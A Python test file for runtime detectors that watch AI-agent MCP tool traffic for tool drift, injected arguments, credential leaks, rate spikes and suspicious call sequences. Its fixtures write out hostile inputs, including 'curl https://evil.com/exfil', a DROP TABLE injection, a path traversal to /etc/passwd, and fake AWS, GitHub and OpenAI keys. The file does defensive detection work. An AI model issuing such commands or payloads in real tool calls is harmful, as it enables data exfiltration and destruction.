"""Tests for runtime MCP traffic detectors."""

from agent_bom.runtime.detectors import (
    Alert,
    AlertSeverity,
    ArgumentAnalyzer,
    CredentialLeakDetector,
    RateLimitTracker,
    SequenceAnalyzer,
    ToolDriftDetector,
)

# ─── Alert model ─────────────────────────────────────────────────────────────


def test_alert_to_dict():
    alert = Alert(
        detector="test",
        severity=AlertSeverity.HIGH,
        message="Test alert",
        details={"key": "value"},
    )
    d = alert.to_dict()
    assert d["type"] == "runtime_alert"
    assert d["detector"] == "test"
    assert d["severity"] == "high"
    assert d["message"] == "Test alert"
    assert "ts" in d


def test_alert_severity_enum():
    assert AlertSeverity.CRITICAL.value == "critical"
    assert AlertSeverity.INFO.value == "info"


# ─── ToolDriftDetector ───────────────────────────────────────────────────────


def test_drift_first_call_sets_baseline():
    d = ToolDriftDetector()
    alerts = d.check(["read_file", "write_file"])
    assert alerts == []
    assert d.baseline == {"read_file", "write_file"}


def test_drift_no_change():
    d = ToolDriftDetector()
    d.set_baseline(["read_file", "write_file"])
    alerts = d.check(["read_file", "write_file"])
    assert alerts == []


def test_drift_new_tool_detected():
    d = ToolDriftDetector()
    d.set_baseline(["read_file", "write_file"])
    alerts = d.check(["read_file", "write_file", "exec_command"])
    assert len(alerts) == 1
    assert alerts[0].severity == AlertSeverity.HIGH
    assert "exec_command" in alerts[0].message
    assert "new_tools" in alerts[0].details


def test_drift_removed_tool_detected():
    d = ToolDriftDetector()
    d.set_baseline(["read_file", "write_file", "delete_file"])
    alerts = d.check(["read_file", "write_file"])
    assert len(alerts) == 1
    assert alerts[0].severity == AlertSeverity.MEDIUM
    assert "delete_file" in alerts[0].message


def test_drift_both_new_and_removed():
    d = ToolDriftDetector()
    d.set_baseline(["a", "b"])
    alerts = d.check(["b", "c"])
    assert len(alerts) == 2
    severities = {a.severity for a in alerts}
    assert AlertSeverity.HIGH in severities
    assert AlertSeverity.MEDIUM in severities


def test_drift_explicit_baseline():
    d = ToolDriftDetector()
    d.set_baseline(["tool1"])
    assert d.baseline == {"tool1"}


# ─── ArgumentAnalyzer ────────────────────────────────────────────────────────


def test_arg_analyzer_clean_args():
    a = ArgumentAnalyzer()
    alerts = a.check("read_file", {"path": "/tmp/safe.txt"})
    assert alerts == []


def test_arg_analyzer_shell_metachar():
    a = ArgumentAnalyzer()
    alerts = a.check("run_query", {"query": "SELECT * FROM users; DROP TABLE users"})
    assert len(alerts) >= 1
    assert any("Shell metacharacter" in al.message for al in alerts)


def test_arg_analyzer_path_traversal():
    a = ArgumentAnalyzer()
    alerts = a.check("read_file", {"path": "../../../etc/passwd"})
    assert len(alerts) >= 1
    assert any("Path traversal" in al.message for al in alerts)


def test_arg_analyzer_command_injection():
    a = ArgumentAnalyzer()
    alerts = a.check("write_file", {"content": "curl https://evil.com/exfil"})
    assert len(alerts) >= 1
    assert any("Command injection" in al.message for al in alerts)


def test_arg_analyzer_env_var_access():
    a = ArgumentAnalyzer()
    alerts = a.check("eval", {"code": "$AWS_SECRET_ACCESS_KEY"})
    assert len(alerts) >= 1


def test_arg_analyzer_credential_value():
    a = ArgumentAnalyzer()
    alerts = a.check("write_file", {"content": "password=supersecretvalue123"})
    assert len(alerts) >= 1
    assert any("Credential-like value" in al.message for al in alerts)


def test_arg_analyzer_non_string_value():
    a = ArgumentAnalyzer()
    alerts = a.check("tool", {"count": 42})
    assert alerts == []


def test_arg_analyzer_value_preview_truncated():
    a = ArgumentAnalyzer()
    alerts = a.check("tool", {"cmd": "curl " + "x" * 200})
    assert any(len(al.details.get("value_preview", "")) <= 100 for al in alerts)


# ─── CredentialLeakDetector ──────────────────────────────────────────────────


def test_cred_leak_clean():
    d = CredentialLeakDetector()
    alerts = d.check("read_file", "This is a normal file content with no secrets.")
    assert alerts == []


def test_cred_leak_aws_key():
    d = CredentialLeakDetector()
    alerts = d.check("read_file", "Found key: AKIAIOSFODNN7EXAMPLE")
    assert len(alerts) == 1
    assert alerts[0].severity == AlertSeverity.CRITICAL
    assert "AWS" in alerts[0].message


def test_cred_leak_github_token():
    d = CredentialLeakDetector()
    alerts = d.check("exec", "token=ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij")
    assert len(alerts) >= 1
    assert any("GitHub" in a.message for a in alerts)


def test_cred_leak_openai_key():
    d = CredentialLeakDetector()
    alerts = d.check("query", "OPENAI_API_KEY=sk-abcdefghij1234567890abcdefghij")
    assert len(alerts) >= 1


def test_cred_leak_private_key():
    d = CredentialLeakDetector()
    alerts = d.check("read", "-----BEGIN RSA PRIVATE KEY-----\nMIIE...")
    assert len(alerts) >= 1
    assert any("Private Key" in a.message for a in alerts)


def test_cred_leak_connection_string():
    d = CredentialLeakDetector()
    alerts = d.check("config", "mongodb://admin:pass@host:27017/db")
    assert len(alerts) >= 1
    assert any("Connection String" in a.message for a in alerts)


def test_cred_leak_redacted_preview():
    d = CredentialLeakDetector()
    alerts = d.check("read", "key=AKIAIOSFODNN7EXAMPLE")
    for alert in alerts:
        for preview in alert.details.get("redacted_preview", []):
            assert "..." in preview or preview == "***"


def test_cred_leak_multiple_types():
    d = CredentialLeakDetector()
    text = "AKIAIOSFODNN7EXAMPLE and ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij"
    alerts = d.check("dump", text)
    assert len(alerts) >= 2


# ─── RateLimitTracker ────────────────────────────────────────────────────────


def test_rate_limit_under_threshold():
    r = RateLimitTracker(threshold=10, window_seconds=60.0)
    for _ in range(9):
        alerts = r.record("tool1")
    assert all(len(a) == 0 for a in [alerts])


def test_rate_limit_at_threshold():
    r = RateLimitTracker(threshold=5, window_seconds=60.0)
    alerts = []
    for _ in range(5):
        alerts = r.record("tool1")
    assert len(alerts) == 1
    assert alerts[0].severity == AlertSeverity.MEDIUM
    assert "tool1" in alerts[0].message


def test_rate_limit_different_tools_independent():
    r = RateLimitTracker(threshold=3, window_seconds=60.0)
    for _ in range(2):
        r.record("tool1")
        r.record("tool2")
    # Neither should trigger at 2 each
    alerts1 = r.record("tool1")
    alerts2 = r.record("tool2")
    assert len(alerts1) == 1  # tool1 hit 3
    assert len(alerts2) == 1  # tool2 hit 3


def test_rate_limit_properties():
    r = RateLimitTracker(threshold=10, window_seconds=30.0)
    assert r.threshold == 10
    assert r.window == 30.0


# ─── SequenceAnalyzer ────────────────────────────────────────────────────────


def test_sequence_no_match():
    s = SequenceAnalyzer()
    alerts = s.record("list_files")
    assert alerts == []


def test_sequence_exfiltration():
    s = SequenceAnalyzer()
    s.record("read_file")
    alerts = s.record("http_request")
    assert len(alerts) >= 1
    assert any("exfiltration" in a.message.lower() for a in alerts)


def test_sequence_credential_harvest():
    s = SequenceAnalyzer()
    s.record("get_config")
    alerts = s.record("send_message")
    assert len(alerts) >= 1


def test_sequence_privilege_escalation():
    s = SequenceAnalyzer()
    s.record("exec_command")
    alerts = s.record("write_file")
    assert len(alerts) >= 1
    assert any("privilege" in a.message.lower() for a in alerts)


def test_sequence_reconnaissance():
    s = SequenceAnalyzer()
    s.record("list_files")
    s.record("search_code")
    alerts = s.record("read_file")
    assert len(alerts) >= 1
    assert any("reconnaissance" in a.message.lower() for a in alerts)


def test_sequence_window_size():
    s = SequenceAnalyzer(window_size=3)
    s.record("unrelated1")
    s.record("unrelated2")
    s.record("unrelated3")
    # Window should push out old calls
    s.record("read_file")
    alerts = s.record("http_request")
    assert len(alerts) >= 1  # Still detected in window


def test_sequence_recent_calls():
    s = SequenceAnalyzer(window_size=5)
    s.record("a")
    s.record("b")
    assert s.recent_calls == ["a", "b"]


def test_sequence_no_false_positive():
    s = SequenceAnalyzer()
    s.record("list_files")
    s.record("list_files")
    # Two list calls with no read after should not trigger reconnaissance
    alerts = s.record("list_files")
    # Only the 3-step recon pattern with read at end should trigger
    assert not any("exfiltration" in a.message.lower() for a in alerts)
